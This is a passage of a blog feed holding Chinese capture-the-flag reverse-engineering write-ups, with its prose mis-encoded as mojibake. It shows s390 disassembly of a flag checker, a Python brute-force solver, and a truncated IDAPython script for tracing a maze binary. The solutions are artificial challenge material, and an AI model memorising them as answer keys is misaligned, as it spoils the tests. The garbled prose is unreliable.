æ“ä½œ</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºç”¨äº†ä¸¤ä¸ªå‡½æ•°åœ¨é‡Œé¢ä¸€ä¸ªåœ°å€0x1000910ï¼Œå¦ä¸€ä¸ªåœ°å€0x1000a08</p><p>å…ˆçœ‹åœ°å€0x1000910å¾—å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">1000910:eb bf f0 58 00 24 stmg%r11,%r15,88(%r15)</span><br><span class="line"> 1000916:e3 f0 ff 50 ff 71 lay%r15,-176(%r15)</span><br><span class="line"> 100091c:b9 04 00 bf       lgr%r11,%r15</span><br><span class="line"> 1000920:e3 20 b0 a0 00 24 stg%r2,160(%r11)</span><br><span class="line"> 1000926:e3 20 b0 a0 00 04 lg%r2,160(%r11)</span><br><span class="line"> 100092c:c0 e5 ff ff ff 02 brasl%r14,0x1000730//åŠ è½½å‡½æ•°åœ°å€0x1000730 (strlen)</span><br><span class="line"> 1000932:b9 04 00 12       lgr%r1,%r2</span><br><span class="line"> 1000936:a7 1f 00 20       cghi%r1,32  //cmp len(input)ï¼Œ32</span><br><span class="line"> 100093a:a7 84 00 06       je0x1000946</span><br><span class="line"> 100093e:a7 18 00 00       lhi%r1,0</span><br><span class="line"> 1000942:a7 f4 00 56       j0x10009ee</span><br><span class="line"> 1000946:e5 4c b0 ac 00 00 mvhi172(%r11),0</span><br><span class="line"> 100094c:a7 f4 00 49       j0x10009de</span><br><span class="line"> 1000950:e3 10 b0 ac 00 14 lgf%r1,172(%r11)</span><br><span class="line"> 1000956:e3 10 b0 a0 00 08 ag%r1,160(%r11)</span><br><span class="line"> 100095c:43 10 10 00       ic%r1,0(%r1)</span><br><span class="line"> 1000960:b9 94 00 11       llcr%r1,%r1</span><br><span class="line"> 1000964:c2 1f 00 00 00 2f clfi%r1,47   //(0) </span><br><span class="line"> 100096a:a7 c4 00 11       jle0x100098c    </span><br><span class="line"> 100096e:e3 10 b0 ac 00 14 lgf%r1,172(%r11)</span><br><span class="line"> 1000974:e3 10 b0 a0 00 08 ag%r1,160(%r11)</span><br><span class="line"> 100097a:43 10 10 00       ic%r1,0(%r1)</span><br><span class="line"> 100097e:b9 94 00 11       llcr%r1,%r1</span><br><span class="line"> 1000982:c2 1f 00 00 00 39 clfi%r1,57    //(9)</span><br><span class="line"> 1000988:a7 c4 00 24       jle0x10009d0</span><br><span class="line"> 100098c:e3 10 b0 ac 00 14 lgf%r1,172(%r11)</span><br><span class="line"> 1000992:e3 10 b0 a0 00 08 ag%r1,160(%r11)</span><br><span class="line"> 1000998:43 10 10 00       ic%r1,0(%r1)</span><br><span class="line"> 100099c:b9 94 00 11       llcr%r1,%r1</span><br><span class="line"> 10009a0:c2 1f 00 00 00 60 clfi%r1,96    //(a)</span><br><span class="line"> 10009a6:a7 c4 00 11       jle0x10009c8</span><br><span class="line"> 10009aa:e3 10 b0 ac 00 14 lgf%r1,172(%r11)</span><br><span class="line"> 10009b0:e3 10 b0 a0 00 08 ag%r1,160(%r11)</span><br><span class="line"> 10009b6:43 10 10 00       ic%r1,0(%r1)</span><br><span class="line"> 10009ba:b9 94 00 11       llcr%r1,%r1</span><br><span class="line"> 10009be:c2 1f 00 00 00 66 clfi%r1,102   //(f)</span><br><span class="line"> 10009c4:a7 c4 00 09       jle0x10009d6</span><br><span class="line"> 10009c8:a7 18 00 00       lhi%r1,0</span><br><span class="line"> 10009cc:a7 f4 00 11       j0x10009ee</span><br><span class="line"> 10009d0:18 00             lr%r0,%r0</span><br><span class="line"> 10009d2:a7 f4 00 03       j0x10009d8</span><br><span class="line"> 10009d6:18 00             lr%r0,%r0</span><br><span class="line"> 10009d8:eb 01 b0 ac 00 6a asi172(%r11),1</span><br><span class="line"> 10009de:58 10 b0 ac       l%r1,172(%r11)</span><br><span class="line"> 10009e2:a7 1e 00 1f       chi%r1,31        //å¾ªç¯åˆ¤æ–­æ˜¯å¦è¶…è¿‡input[31]</span><br><span class="line"> 10009e6:a7 c4 ff b5       jle0x1000950</span><br><span class="line"> 10009ea:a7 18 00 01       lhi%r1,1</span><br><span class="line"> 10009ee:b9 14 00 11       lgfr%r1,%r1</span><br><span class="line"> 10009f2:b9 04 00 21       lgr%r2,%r1</span><br><span class="line"> 10009f6:e3 40 b1 20 00 04 lg%r4,288(%r11)</span><br><span class="line"> 10009fc:eb bf b1 08 00 04 lmg%r11,%r15,264(%r11)</span><br><span class="line"> 1000a02:07 f4             br%r4</span><br><span class="line"> 1000a04:07 07             nopr%r7</span><br><span class="line"> 1000a06:07 07             nopr%r7</span><br></pre></td></tr></table></figure><p><strong>å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œflagçš„é•¿åº¦ä¸º32ï¼Œè€Œä¸”æ˜¯0<del>9ï¼Œa</del>fä¹‹é—´çš„å­—ç¬¦</strong></p><p>çœ‹ç¬¬äºŒä¸ªåœ°å€0x1000a08çš„å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">1000a08:b3 c1 00 2b       ldgr%f2,%r11</span><br><span class="line"> 1000a0c:b3 c1 00 0f       ldgr%f0,%r15</span><br><span class="line"> 1000a10:e3 f0 ff 48 ff 71 lay%r15,-184(%r15)</span><br><span class="line"> 1000a16:b9 04 00 bf       lgr%r11,%r15</span><br><span class="line"> 1000a1a:e3 20 b0 a0 00 24 stg%r2,160(%r11)    </span><br><span class="line"> 1000a20:e5 4c b0 a8 00 00 mvhi168(%r11),0</span><br><span class="line"> 1000a26:a7 f4 00 4b       j0x1000abc</span><br><span class="line"> 1000a2a:e3 10 b0 a8 00 14 lgf%r1,168(%r11)</span><br><span class="line"> 1000a30:e3 10 b0 a0 00 08 ag%r1,160(%r11)   //r1 = input[i]</span><br><span class="line"> 1000a36:43 10 10 00       ic%r1,0(%r1)</span><br><span class="line"> 1000a3a:b9 94 00 11       llcr%r1,%r1</span><br><span class="line"> 1000a3e:50 10 b0 b4       st%r1,180(%r11)   //r11[180] = r1</span><br><span class="line"> 1000a42:58 30 b0 b4       l%r3,180(%r11)   //r3 = r1 (r3 = input)</span><br><span class="line"> 1000a46:71 30 b0 b4       ms%r3,180(%r11)   //r3*r3   (input*input)</span><br><span class="line"> 1000a4a:c0 10 00 04 d3 ef larl%r1,0x109b228</span><br><span class="line"> 1000a50:e3 20 b0 a8 00 14 lgf%r2,168(%r11)</span><br><span class="line"> 1000a56:eb 22 00 02 00 0d sllg%r2,%r2,2  // &lt;&lt; 2 (ç›¸å½“äº*4)</span><br><span class="line"> 1000a5c:58 12 10 00       l%r1,0(%r2,%r1) //0x109b228[i&lt;&lt;2]</span><br><span class="line"> 1000a60:b2 52 00 31       msr%r3,%r1        //0x109b228[i&lt;&lt;2]*r3[i]*r3[i](r3å˜åŒ–)</span><br><span class="line">    //(0x109b228[i&lt;&lt;2]*input[i]*input[i])</span><br><span class="line"> 1000a64:c0 10 00 04 d3 e2 larl%r1,0x109b228</span><br><span class="line"> 1000a6a:e3 20 b0 a8 00 14 lgf%r2,168(%r11)</span><br><span class="line"> 1000a70:a7 2b 00 20       aghi%r2,32</span><br><span class="line"> 1000a74:eb 22 00 02 00 0d sllg%r2,%r2,2  //r2 = r2 &lt;&lt; 2</span><br><span class="line"> 1000a7a:58 12 10 00       l%r1,0(%r2,%r1) //0x109b228[(i+32)&lt;&lt;2]</span><br><span class="line"> 1000a7e:71 10 b0 b4       ms%r1,180(%r11)  //0x109b228[(i+32)&lt;&lt;2]*input[i](r1å˜åŒ–)</span><br><span class="line"> 1000a82:1a 31             ar%r3,%r1        //0x109b228[i&lt;&lt;2]*input[i]*input[i] + 0x109b228[(i+32)&lt;&lt;2]*input[i]</span><br><span class="line"> 1000a84:c0 10 00 04 d3 d2 larl%r1,0x109b228</span><br><span class="line"> 1000a8a:e3 20 b0 a8 00 14 lgf%r2,168(%r11)  //i</span><br><span class="line"> 1000a90:a7 2b 00 40       aghi%r2,64     //i+64</span><br><span class="line"> 1000a94:eb 22 00 02 00 0d sllg%r2,%r2,2  //(i+64) &lt;&lt; 2</span><br><span class="line"> 1000a9a:58 12 10 00       l%r1,0(%r2,%r1) //r1 = 0x109b228[(i+64) &lt;&lt; 2]</span><br><span class="line"> 1000a9e:1a 31             ar%r3,%r1        //add r3 + 0x109b228[(i+64) &lt;&lt; 2]</span><br><span class="line"> 1000aa0:c4 18 00 04 d3 68 lgrl%r1,0x109b170</span><br><span class="line"> 1000aa6:e3 20 b0 a8 00 14 lgf%r2,168(%r11)  //i</span><br><span class="line"> 1000aac:eb 22 00 02 00 0d sllg%r2,%r2,2  // i &lt;&lt; 2  </span><br><span class="line"> 1000ab2:50 32 10 00       st%r3,0(%r2,%r1) //r1[r2] = r3</span><br><span class="line"> 1000ab6:eb 01 b0 a8 00 6a asi168(%r11),1    //i++;</span><br><span class="line"> 1000abc:58 10 b0 a8       l%r1,168(%r11)</span><br><span class="line"> 1000ac0:a7 1e 00 1f       chi%r1,31</span><br><span class="line"> 1000ac4:a7 c4 ff b3       jle0x1000a2a   //cmp</span><br><span class="line"> 1000ac8:e5 4c b0 ac 00 01 mvhi172(%r11),1</span><br><span class="line"> 1000ace:e5 4c b0 b0 00 00 mvhi176(%r11),0</span><br><span class="line"> 1000ad4:a7 f4 00 21       j0x1000b16</span><br><span class="line"> 1000ad8:c4 18 00 04 d3 4c lgrl%r1,0x109b170 //å¾ªç¯åˆ¤æ–­</span><br><span class="line"> 1000ade:e3 20 b0 b0 00 14 lgf%r2,176(%r11)</span><br><span class="line"> 1000ae4:eb 22 00 02 00 0d sllg%r2,%r2,2</span><br><span class="line"> 1000aea:58 32 10 00       l%r3,0(%r2,%r1)</span><br><span class="line"> 1000aee:c0 10 00 04 d3 5d larl%r1,0x109b1a8</span><br><span class="line"> 1000af4:e3 20 b0 b0 00 14 lgf%r2,176(%r11)</span><br><span class="line"> 1000afa:eb 22 00 02 00 0d sllg%r2,%r2,2</span><br><span class="line"> 1000b00:58 12 10 00       l%r1,0(%r2,%r1)</span><br><span class="line"> 1000b04:19 31             cr%r3,%r1</span><br><span class="line"> 1000b06:a7 84 00 05       je0x1000b10</span><br><span class="line"> 1000b0a:e5 4c b0 ac 00 00 mvhi172(%r11),0</span><br><span class="line"> 1000b10:eb 01 b0 b0 00 6a asi176(%r11),1</span><br><span class="line"> 1000b16:58 10 b0 b0       l%r1,176(%r11)</span><br><span class="line"> 1000b1a:a7 1e 00 1f       chi%r1,31//cmp</span><br><span class="line"> 1000b1e:a7 c4 ff dd       jle0x1000ad8</span><br><span class="line"> 1000b22:58 10 b0 ac       l%r1,172(%r11)</span><br><span class="line"> 1000b26:b9 14 00 11       lgfr%r1,%r1</span><br><span class="line"> 1000b2a:b9 04 00 21       lgr%r2,%r1</span><br><span class="line"> 1000b2e:b3 cd 00 b2       lgdr%r11,%f2</span><br><span class="line"> 1000b32:b3 cd 00 f0       lgdr%r15,%f0</span><br><span class="line"> 1000b36:07 fe             br%r14</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºåœ°å€0x1000a08çš„å‡½æ•°å°†0x109b228çš„å€¼ä¸0x109b1a8ä¸­çš„å€¼åšæ¯”è¾ƒï¼Œæå–æ•°æ®å¯ä»¥ç›´æ¥çˆ†ç ´äº†</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150421.png" alt="image-20201122212606748"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line">data=    [<span class="number">0x0000b2b0</span>, <span class="number">0x00006e72</span>, <span class="number">0x00006061</span>, <span class="number">0x0000565d</span>,</span><br><span class="line">          <span class="number">0x0000942d</span>, <span class="number">0x0000ac79</span>, <span class="number">0x0000391c</span>, <span class="number">0x0000643d</span>,</span><br><span class="line">          <span class="number">0x0000ec3f</span>, <span class="number">0x0000bd10</span>, <span class="number">0x0000c43e</span>, <span class="number">0x00007a65</span>,</span><br><span class="line">          <span class="number">0x0000184b</span>, <span class="number">0x0000ef5b</span>, <span class="number">0x00005a06</span>, <span class="number">0x0000a8c0</span>,</span><br><span class="line">          <span class="number">0x0000f64b</span>, <span class="number">0x0000c774</span>, <span class="number">0x000002ff</span>, <span class="number">0x00008e57</span>,</span><br><span class="line">          <span class="number">0x0000aed9</span>, <span class="number">0x0000d8a9</span>, <span class="number">0x0000230c</span>, <span class="number">0x000074e8</span>,</span><br><span class="line">          <span class="number">0x0000c2a6</span>, <span class="number">0x000088b3</span>, <span class="number">0x0000af2a</span>, <span class="number">0x00009ea7</span>,</span><br><span class="line">          <span class="number">0x0000ce8a</span>, <span class="number">0x00005924</span>, <span class="number">0x0000d276</span>, <span class="number">0x000056d4</span>,</span><br><span class="line">          <span class="number">0x000077d7</span>, <span class="number">0x0000990e</span>, <span class="number">0x0000b585</span>, <span class="number">0x00004bcd</span>,</span><br><span class="line">          <span class="number">0x00005277</span>, <span class="number">0x00001afc</span>, <span class="number">0x00008c8a</span>, <span class="number">0x0000cdb5</span>,</span><br><span class="line">          <span class="number">0x00006e26</span>, <span class="number">0x00004c22</span>, <span class="number">0x0000673f</span>, <span class="number">0x0000daff</span>,</span><br><span class="line">          <span class="number">0x00000fac</span>, <span class="number">0x000086c7</span>, <span class="number">0x0000e048</span>, <span class="number">0x0000c483</span>,</span><br><span class="line">          <span class="number">0x000085d3</span>, <span class="number">0x00002204</span>, <span class="number">0x0000c2ee</span>, <span class="number">0x0000e07f</span>,</span><br><span class="line">          <span class="number">0x00000caf</span>, <span class="number">0x0000bf76</span>, <span class="number">0x000063fe</span>, <span class="number">0x0000bffb</span>,</span><br><span class="line">          <span class="number">0x00004b09</span>, <span class="number">0x0000e5b3</span>, <span class="number">0x00008bda</span>, <span class="number">0x000096df</span>,</span><br><span class="line">          <span class="number">0x0000866d</span>, <span class="number">0x00001719</span>, <span class="number">0x00006bcf</span>, <span class="number">0x0000adcc</span>,</span><br><span class="line">          <span class="number">0x00000f2b</span>, <span class="number">0x000051ce</span>, <span class="number">0x00001549</span>, <span class="number">0x000020c1</span>,</span><br><span class="line">          <span class="number">0x00003a8d</span>, <span class="number">0x000005f5</span>, <span class="number">0x00005403</span>, <span class="number">0x00001125</span>,</span><br><span class="line">          <span class="number">0x00009161</span>, <span class="number">0x0000e2a5</span>, <span class="number">0x00005196</span>, <span class="number">0x0000d8d2</span>,</span><br><span class="line">          <span class="number">0x0000d644</span>, <span class="number">0x0000ee86</span>, <span class="number">0x00003896</span>, <span class="number">0x00002e71</span>,</span><br><span class="line">          <span class="number">0x0000a6f1</span>, <span class="number">0x0000dfcf</span>, <span class="number">0x00003ece</span>, <span class="number">0x00007d49</span>,</span><br><span class="line">          <span class="number">0x0000c24d</span>, <span class="number">0x0000237e</span>, <span class="number">0x00009352</span>, <span class="number">0x00007a97</span>,</span><br><span class="line">          <span class="number">0x00007bfa</span>, <span class="number">0x0000cbaa</span>, <span class="number">0x000010dc</span>, <span class="number">0x00003bd9</span>,</span><br><span class="line">          <span class="number">0x00007d7b</span>, <span class="number">0x00003b88</span>, <span class="number">0x0000b0d0</span>, <span class="number">0x0000e8bc</span>]</span><br><span class="line">result = [<span class="number">0x08a73233</span>, <span class="number">0x116db0f6</span>, <span class="number">0x0e654937</span>, <span class="number">0x03c374a7</span>,</span><br><span class="line">          <span class="number">0x16bc8ed9</span>, <span class="number">0x0846b755</span>, <span class="number">0x08949f47</span>, <span class="number">0x04a13c27</span>,</span><br><span class="line">          <span class="number">0x0976cf0a</span>, <span class="number">0x07461189</span>, <span class="number">0x1e1a5c12</span>, <span class="number">0x11e64d96</span>,</span><br><span class="line">          <span class="number">0x03cf09b3</span>, <span class="number">0x093cb610</span>, <span class="number">0x0d41ea64</span>, <span class="number">0x07648050</span>,</span><br><span class="line">          <span class="number">0x092039bf</span>, <span class="number">0x08e7f1f7</span>, <span class="number">0x004d871f</span>, <span class="number">0x1680f823</span>,</span><br><span class="line">          <span class="number">0x06f3c3eb</span>, <span class="number">0x2205134d</span>, <span class="number">0x015c6a7c</span>, <span class="number">0x11c67ed0</span>,</span><br><span class="line">          <span class="number">0x0817b32e</span>, <span class="number">0x06bd9b92</span>, <span class="number">0x08806b0c</span>, <span class="number">0x06aaa515</span>,</span><br><span class="line">          <span class="number">0x205b9f76</span>, <span class="number">0x0de963e9</span>, <span class="number">0x2194e8e2</span>, <span class="number">0x047593bc</span>]</span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">input</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7e</span>,<span class="number">1</span>):</span><br><span class="line">        a = <span class="built_in">input</span> * <span class="built_in">input</span> * data[i]+ data[i + <span class="number">32</span>] * <span class="built_in">input</span>+ data[i + <span class="number">64</span>]</span><br><span class="line">        <span class="keyword">if</span> a == result[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">input</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;easyZ&quot;&gt;&lt;a href=&quot;#easyZ&quot; class=&quot;headerlink&quot; title=&quot;easyZ&quot;&gt;&lt;/a&gt;easyZ&lt;/h1&gt;&lt;p&gt;ä¸€ç‚¹éƒ½ä¸ç®€å•å¥½å—ï¼Œæ¡†æ¶(S390)éƒ½çœ‹ä¸å‡ºæ¥ğŸ¤ª&lt;/p&gt;
&lt;p&gt;å…ˆç”¨idaæ‰“å¼€å‘ç°ä¸èƒ½åæ±‡ç¼–&lt;/p&gt;
&lt;p&gt;ç”¨lin</summary>
      
    
    
    
    <category term="reverse ctf" scheme="http://example.com/categories/reverse-ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>å·…å³°æå®¢reverse baby_maze</title>
    <link href="http://example.com/2021/08/13/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2reverse%20baby_maze/"/>
    <id>http://example.com/2021/08/13/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2reverse%20baby_maze/</id>
    <published>2021-08-13T11:39:43.655Z</published>
    <updated>2021-08-13T07:52:23.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å·…å³°æå®¢reverse-baby-maze"><a href="#å·…å³°æå®¢reverse-baby-maze" class="headerlink" title="å·…å³°æå®¢reverse baby_maze"></a>å·…å³°æå®¢reverse baby_maze</h1><p>è¿™é¢˜é€šè¿‡ida64æ‰“å¼€åå‘ç°æ˜¯å¾ˆå¤šä¸ªå‡½æ•°å†™çš„åœ°å›¾ï¼Œäººçœ‹å‚»äº†`(<em>&gt;ï¹&lt;</em>)â€²</p><p>åæ¥ä¸€æƒ³ ç›´æ¥æ‰¾åˆ°ç»ˆç‚¹çš„å‡½æ•°ï¼Œç„¶ååˆ©ç”¨äº¤å‰å¼•ç”¨æº¯å›åˆ°èµ·ç‚¹å°±è¡Œäº†ï¼ˆâ€å¥½åƒâ€è¿˜æŒºç®€å•çš„ğŸ˜ƒï¼‰</p><p>é€šè¿‡å­—ç¬¦ä¸².</p><p><strong>Good Job. \nAnd the flag is flag md5(your input)\nIf not, you may need to go faster!</strong></p><p>æ‰¾åˆ°ç»ˆç‚¹sub_54DE35</p><p>é€šè¿‡<strong>Welcome to TastelessMaze!</strong> æ‰¾åˆ°ä¸»å‡½æ•°å†æ‰¾åˆ°èµ·ç‚¹sub_40187C()</p><p>æˆ‘åŸæœ¬ä¸€ä¸ªä¸€ä¸ªæ…¢æ…¢å¾€ä¸Šæº¯å›ï¼Œç»“æœå¡æ­»äº†</p><p>å‡ºç°äº†è¿™ç§æƒ…å†µ</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210802102522.png" alt="image-20210802102522230"></p><p>æˆ‘éœ€è¦çœ‹æ˜¯è°èµ°åˆ°äº†sub_53E6B7 ä¸€çœ‹Då…ˆèµ°äº†sub_53CE65()è¿™ä¸ªå‡½æ•°ï¼Œå†æ¥èµ°sub_53E6B7</p><p>sub_53CE65()é‡Œé¢åˆæ˜¯switch äººéº»äº†ğŸ¤¡</p><p>æˆ‘è«å¾—åŠæ³•</p><p>äº‹åçœ‹å¸ˆå‚…ä»¬çš„wpï¼ŒQAQï¼Œç›´æ¥æ­£é¢æš´åŠ›è½ï¼Œåˆ©ç”¨idapythonä¸­çš„<code>gen_r_call_chain</code>å‡½æ•°</p><p>å­¦ä¹ ç½‘å€ï¼š</p><p><a href="https://blog.51cto.com/watertoeast/2287039">https://blog.51cto.com/watertoeast/2287039</a></p><p><a href="https://zhuanlan.zhihu.com/p/395205287">https://zhuanlan.zhihu.com/p/395205287</a></p><p>ä½†æ˜¯åŸºäºæœ¬é¢˜çš„è¯ï¼Œä¸€ç›´é€’æ¨åˆ°ç»ˆç‚¹å°±å¯ä»¥å›æº¯äº†ï¼Œæ‰€ä»¥è¦å†gen_r_call_chainä¸­æ·»åŠ ä¸€ä¸ªç»ˆç‚¹çš„å‚æ•°</p><p>è¿˜è¦æŸ¥è¯¢å‡½æ•°<code>get_my_callee</code>ï¼Œæ¥å¾—åˆ°xrefçš„å¼•ç”¨å‡½æ•°åˆ—è¡¨</p><p>ä¹Ÿå°±æ˜¯</p><p>idaå¿«æ·é”® Shift+F2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line">visited_func = <span class="built_in">set</span>()</span><br><span class="line">steps = []</span><br><span class="line">r_call_chain = []</span><br><span class="line">idx2chr = &#123;<span class="number">4</span>: <span class="string">&#x27;W&#x27;</span>,<span class="number">5</span>: <span class="string">&#x27;D&#x27;</span>,<span class="number">6</span>: <span class="string">&#x27;S&#x27;</span>,<span class="number">7</span>: <span class="string">&#x27;A&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_r_call_chain</span>(<span class="params">func_name, osintneting,destination</span>):</span></span><br><span class="line">    <span class="keyword">del</span> r_call_chain[:]</span><br><span class="line">    <span class="keyword">del</span> steps[:]</span><br><span class="line">    visited_func = <span class="built_in">set</span>()</span><br><span class="line">    get_my_caller(func_name, osintneting,destination)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_my_caller</span>(<span class="params">func_name, osintneting,destination</span>):</span></span><br><span class="line"></span><br><span class="line">    cstr = <span class="string">&#x27;&#123;0&#125;\t&#x27;</span>.<span class="built_in">format</span>(func_name)</span><br><span class="line">    <span class="keyword">if</span> cstr <span class="keyword">not</span> <span class="keyword">in</span> visited_func:</span><br><span class="line">        r_call_chain.append(cstr)</span><br><span class="line">        visited_func.add(cstr)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    addr = get_name_ea(<span class="number">0</span>, func_name)</span><br><span class="line">    addr_ref_to = get_first_fcref_to(addr)</span><br><span class="line"></span><br><span class="line">    osinteneting_end = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> addr_ref_to == BADADDR:</span><br><span class="line">        osinteneting_end = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> osintneting == -<span class="number">1</span>:</span><br><span class="line">        osinteneting_end = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> osintneting == <span class="number">1</span>:</span><br><span class="line">        osinteneting_end = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (destination == func_name <span class="keyword">or</span> osintneting == <span class="number">1</span>):</span><br><span class="line">        length = <span class="built_in">len</span>(steps)</span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">            sys.stdout.write(steps[length - idx - <span class="number">1</span>])</span><br><span class="line">        sys.stdout.write(<span class="string">&#x27; &#x27;</span> + func_name)</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        r_call_chain.pop()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> osinteneting_end <span class="keyword">is</span> <span 